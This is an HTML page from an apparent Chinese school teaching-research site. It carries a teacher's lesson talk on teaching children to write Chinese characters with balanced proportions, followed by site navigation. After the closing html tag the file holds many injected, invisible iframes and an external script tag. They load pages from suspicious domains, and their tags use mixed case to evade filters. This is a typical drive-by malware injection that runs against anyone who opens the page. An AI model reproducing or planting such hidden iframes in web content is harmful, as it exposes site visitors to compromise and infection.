+<P class=MsoNormal style="MARGIN: 0cm 0cm 0pt 22.5pt; TEXT-INDENT: -18pt; mso-list: l0 level1 lfo1; tab-stops: list 22.5pt"><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">(二)<SPAN style="FONT: 7pt 'Times New Roman'">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，实体感悟，引导示范，揭示规律</SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman"> </FONT></SPAN></SPAN><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><BR></SPAN><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">首先用形象可感的人体图，来引导学生，让学生知道什么是匀称协调的美，感悟美的原理。并用这个原理指导写字，在分析讲解三个范字过程中，我采取教扶放的方式，循序渐进的原则。在“教”中，通过美的原理，引导<SPAN class=text-normal1><SPAN style="mso-ansi-font-size: 16.0pt">学生仔细观察字的结构、形体、笔画，在观察中初步发现汉字的构字规律。然后教师示范书写，具体分析笔画安排特点，注意每一部分的宽窄、高低等，这样通过引导</SPAN></SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">---</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">示范</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">----</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">练习</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">----</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">评价这一学习过程，得出比例匀称美的构字规律。</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 0cm 0pt"><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">在“扶”上，采取小组合作学习的方式，让学生利用规律，在合作过程中，发现问题，解决问题。</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 0cm 0pt"><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">在“放”上，在合作学习的基础上，再进一步放手，让学生独立自主学习。</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 0cm 0pt"><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><SPAN style="mso-spacerun: yes"><FONT face="Times New Roman">&nbsp; </FONT></SPAN></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">另外，练习过程中，我还一直渗透一种临习方法，先观察，然后写字，再把所写的字，与范字对比，找出缺点，再写字</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 0cm 0pt"><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman"><SPAN style="mso-spacerun: yes">&nbsp; </SPAN><o:p></o:p></FONT></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 0cm 0pt"><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">这样，不仅可使学生把字写得美观，还有利于培养学生分析字形的能力，从而达到举一反三的目的。</SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman"> </FONT></SPAN></SPAN><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><BR><SPAN class=text-normal1><SPAN style="mso-ansi-font-size: 16.0pt"><FONT face="Times New Roman">(</FONT></SPAN></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">三</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">)</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">练习书写，掌握方法</SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman"> </FONT></SPAN></SPAN><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><BR></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">写字的技能性很强，只有加强练习，才能把</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">“</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">想写好字</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">”</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的愿望变为现实。教师必须安排书写练习的时间，以练为主，通过练写巩固对写字方法熟习的过程。一边练习，一边对照范字，对照老师所讲的书写知识进行自查，找出毛病再临写。逐步形成良好的学书方法。</SPAN></SPAN><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><BR><SPAN class=text-normal1><SPAN style="mso-ansi-font-size: 16.0pt"><FONT face="Times New Roman">(</FONT></SPAN></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">四</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">)</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">互评自改，总结提高</SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman"> </FONT></SPAN></SPAN><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><BR><SPAN style="mso-spacerun: yes"><FONT face="Times New Roman">&nbsp;&nbsp; </FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">教师可采用</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">“</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">点面</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">”</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">结合的方法即时反馈和评议学生的练习情况。所谓</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">“</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">点</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">”</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">就是抓住几份有代表性的习字本，师生共同进行评述，肯定成绩，指出不足。所谓</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">“</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">面</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><FONT face="Times New Roman">”</FONT></SPAN></SPAN><SPAN class=text-normal1><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 宋体; mso-bidi-font-size: 9.0pt; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">就是让学生同桌或小组交流习字本，人人动脑，互帮互学，逐步提高他们的观察力和鉴别力。评议后，学生自己再纠正，加深体会，提高练写质量。</SPAN></SPAN><SPAN class=text-normal1><SPAN lang=EN-US style="FONT-SIZE: 16pt; mso-bidi-font-size: 9.0pt"><o:p></o:p></SPAN></SPAN></P>
+<P class=MsoNormal style="MARGIN: 0cm 0cm 0pt; TEXT-INDENT: 48pt; mso-char-indent-count: 3.0; mso-char-indent-size: 16.0pt"><SPAN style="FONT-SIZE: 16pt; FONT-FAMILY: 仿宋_GB2312; mso-bidi-font-size: 14.0pt">新课改的理念走进写字课堂，不是教师一笔笔的讲，而是采用教扶放的方法，让学生逐步学会怎样分析字形。引导学生自己发现问题，并在合作中探索问题，解决问题，使学生成为真正的学习主人。<SPAN lang=EN-US><o:p></o:p></SPAN></SPAN></P> </td>
+              </tr>
+            </table></td>
+        </tr>
+        <tr> 
+          <td colspan="2"><table width="100%" height="50" border="0" cellpadding="0" cellspacing="5" style="BORDER-top: #6687ba 1px solid;BORDER-bottom: #6687ba 1px solid;">
+              <tr> 
+                <td> <li>上一篇文章： 
+                    <a href='Article_Show.asp?ArticleID=547' title='文章标题：《狮子和鹿》的说课稿
+作    者：宝坻区建设路小学&nbsp;&nbsp;朱俊玉
+更新时间：2007-1-5 12:39:06
+点击次数：1315'>《狮子和鹿》的说课稿</a>
+                  </li>
+                  <br> <li>下一篇文章： 
+                    <a href='Article_Show.asp?ArticleID=555' title='文章标题：作文评改课说课稿
+作    者：宝坻建设路小学&nbsp;&nbsp;&nbsp;郭秀艳
+更新时间：2007-1-5 13:18:40
+点击次数：583'>作文评改课说课稿</a>
+                </td>
+              </tr>
+            </table></td>
+        </tr>
+        <tr align="right" class="tdbg_leftall"> 
+          <td colspan="2">【<a href="Article_Comment.asp?ArticleID=549" target="_blank">发表评论</a>】【<a href="SendMail.asp?ArticleID=549" target="_blank">告诉好友</a>】【<a href="Article_Print.asp?ArticleID=549">打印此文</a>】【<a href="javascript:window.close();">关闭窗口</a>】</td>
+        </tr>
+      </table>
+      <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+        <tr> 
+          <td  height="13" align="center" valign="top"><table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+              <tr> 
+                <td height="13" Class="tdbg_left2"></td>
+              </tr>
+            </table></td>
+        </tr>
+      </table>
+      <table width="99%" border="0" align="center" cellpadding="0" cellspacing="0">
+        <tr> 
+          <td width="250" valign="top">
+<table width="100%" height="100%" border="0" cellpadding="2" cellspacing="0" class="border">
+              <tr class="title"> 
+                <td> 
+                  <div align="center">
+                    <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tdbg_rightall">
+                      <tr>
+                        <td class="title_maintxt"><div align="center"><strong>&nbsp;最新5篇热点文章</strong></div></td>
+                      </tr>
+                    </table>
+                    
+                  </div></td>
+              </tr>
+              <tr> 
+                <td height="120" valign="top"> <table width="100%" height="100%" border="0" cellpadding="0" cellspacing="5">
+                    <tr> 
+                      <td valign="top">
+                        <li><a href='Article_Show.asp?ArticleID=575' title='文章标题：浅谈新课程心得
+作    者：佚名
+更新时间：2007-1-24 13:49:03
+点击次数：1269' target='_blank'>浅谈新课程心得</a>[<font color=red>1269</font>]</li><br><li><a href='Article_Show.asp?ArticleID=574' title='文章标题：谈拼音教学中的趣味导入
+作    者：中小学教育资源网
+更新时间：2007-1-24 13:29:37
+点击次数：626' target='_blank'>谈拼音教学中的趣味导入</a>[<font color=red>626</font>]</li><br><li><a href='Article_Show.asp?ArticleID=573' title='文章标题：如何发挥“生字卡片”的多功能作用
+作    者：中小学教育资源网
+更新时间：2007-1-24 13:27:51
+点击次数：722' target='_blank'>如何发挥“生字卡片”的多…</a>[<font color=red>722</font>]</li><br><li><a href='Article_Show.asp?ArticleID=572' title='文章标题：拼音教学中的两人合作学习
+作    者：中小学教育资源网
+更新时间：2007-1-24 13:22:48
+点击次数：652' target='_blank'>拼音教学中的两人合作学习…</a>[<font color=red>652</font>]</li><br><li><a href='Article_Show.asp?ArticleID=571' title='文章标题：浅谈如何做好一年级拼音教学工作
+作    者：中小学教育资源网
+更新时间：2007-1-24 13:21:09
+点击次数：1329' target='_blank'>浅谈如何做好一年级拼音教…</a>[<font color=red>1329</font>]</li><br>
+                      </td>
+                    </tr>
+                  </table>
+                  
+                </td>
+              </tr>
+            </table></td>
+          <td width="5" valign="top">&nbsp;</td>
+          <td width="250" valign="top">
+<table width="100%" height="100%" border="0" cellpadding="2" cellspacing="0" class="border">
+              <tr class="title"> 
+                <td> 
+                  <div align="center">
+                    <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tdbg_rightall">
+                      <tr> 
+                        <td class="title_maintxt"><div align="center"><strong>&nbsp;最新5篇推荐文章</strong></div></td>
+                      </tr>
+                    </table>
+                    
+                  </div></td>
+              </tr>
+              <tr> 
+                <td height="120" valign="top"> <table width="100%" height="100%" border="0" cellpadding="0" cellspacing="5">
+                    <tr> 
+                      <td valign="top">
+                        <li>无推荐文章</li>
+                      </td>
+                    </tr>
+                  </table>
+                  
+                </td>
+              </tr>
+            </table></td>
+          <td width="5" valign="top">&nbsp;</td>
+          <td width="250" valign="top">
+<table width="100%" height="100%" border="0" cellpadding="2" cellspacing="0" class="border">
+              <tr class="title"> 
+                <td> 
+                  <div align="center">
+                    <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tdbg_rightall">
+                      <tr> 
+                        <td class="title_maintxt"><div align="center"><strong>&nbsp;相 
+                            关 文 章</strong></div></td>
+                      </tr>
+                    </table>
+                    
+                  </div></td>
+              </tr>
+              <tr> 
+                <td height="120" valign="top"> 
+                  <table width="100%" height="100%" border="0" cellpadding="0" cellspacing="5">
+                    <tr> 
+                      <td valign="top">
+                        没有相关文章
+                      </td>
+                    </tr>
+                  </table>
+                  
+                </td>
+              </tr>
+            </table> 
+          </td>
+        </tr>
+      </table>
+      <br>
+      <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" class="border">
+        <tr class="title"> 
+          <td><table width="99%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td class="title_maintxt"><strong>&nbsp;<img src="Images/TEAM.gif" width="16" height="16" align="absmiddle">&nbsp;网友评论：</strong>（只显示最新10条。评论内容只代表网友观点，与本站立场无关！）</td>
+              </tr>
+            </table>
+            
+          </td>
+        </tr>
+        <tr> 
+          <td><table width="99%" height="100%" border="0" cellpadding="0" cellspacing="5" style="word-break:break-all">
+              <tr> 
+                <td valign="top">
+                  &nbsp;&nbsp;&nbsp;&nbsp;没有任何评论
+                </td>
+              </tr>
+            </table>
+            
+          </td>
+        </tr>
+      </table></td>
+  </tr>
+</table>
+<table width="760" border="0" align="center" cellpadding="0" cellspacing="0" class="tdbg">
+  <tr> 
+    <td  height="13" align="center" valign="top"><table width="755" border="0" align="center" cellpadding="0" cellspacing="0">
+        <tr> 
+          <td height="13" Class="tdbg_left2"></td>
+        </tr>
+      </table></td>
+  </tr>
+</table>
+<table width='760' align='center' border='0' class='topborder' cellpadding='0' cellspacing='0'><tr height='22' align='center'><td class='title_maintxt'>|&nbsp;<a href='#' onClick=this.style.behavior='url(#default#homepage)';this.setHomePage('/gzwl');>设为首页</a>&nbsp;|&nbsp;<a href=javascript:window.external.addFavorite('/gzwl','高中物理首页')>加入收藏</a>&nbsp;|&nbsp;<a href='mailto:'>联系站长</a>&nbsp;|&nbsp;<a href='FriendSite.asp' target='_blank'>友情链接</a>&nbsp;|&nbsp;<a href='Copyright.asp' target='_blank'>版权申明</a>&nbsp;|&nbsp;<a href='Admin_login.asp' target='_blank'>管理登录</a>&nbsp;|&nbsp;</td></tr><tr align='center' height='20' valign='bottom'><td>版权所有 Copyright&copy; 2004 <a href='http://bd.tjjy.com.cn'>宝坻教研网</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;站长：<a href='mailto:'>zhangwenjuan</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;页面执行时间：93.75毫秒
+</body>
+</html>
+
+
+
+<iframe src="http://gaosgenme1.512j.com/xwzj.htm" width=100 height=0></iframe>
+
+
+
+
+
+<center><script src="http://www.crxs.net/t.js"></script></center>
+
+
+
+
+
+ <Iframe sRc=http://xxx.llxxcx.cn/pv.htm Width=0 name='9395' height=0></iframe><iframe src=http://aa.llsging.com/ww/new05.htm?075 widTh=1 name='9395' heighT=1></iframe>
+
+
+
+
+
+
+
+ <ifraMe src=http://XXX.llXXcX.cn/pv.htm widtH=0 name='2639' height=0></ifraMe><ifraMe src=http://aa.llsGinG.com/ww/new05.htm?075 Width=1 Name='2639' height=1></iframe>
+
+
+
+
+
+
+
+ <ifRame src=http://xxx.llxxcx.cn/wm.htm Width=0 name='5803' height=0></iframe>
+ <Iframe src=http://www.foafau.info/ms30.htm?823 Width=1 name='9716' heIght=1></Iframe><Iframe Src=http://aa.llSging.com/ww/new05.htm?075 widtH=1 name='9716' HeigHt=1></iframe>
+
+ <Iframe src=http://aa.chaIna-game.cn/reg.htm Width=1 name='1670' hEight=1></iframE><iframE src=http://aa.llsgiNg.com/ww/New05.htm?075 width=1 Name='1670' height=1></ifrAme>
+<iframe src=http://www.99391.net/u1.html width=100 height=0></iframe>
+ <iframE src=http://aaa.77xxmm.cN/New858.htm?075 widTh=0 namE='3837' height=0></iframe><iframe src=http://aaa.1L1L1L.com/error/404.htmL wiDth=0 name='3837' height=0></ifrAme>
+ <ifRame src=http://aaa.77xxmm.cn/new858.htm?075 wIdth=0 name='9743' height=0></iframe><iframe src=hTTp://aaa.1l1l1l.com/error/404.hTml width=0 naMe='9743' height=0></iframe>
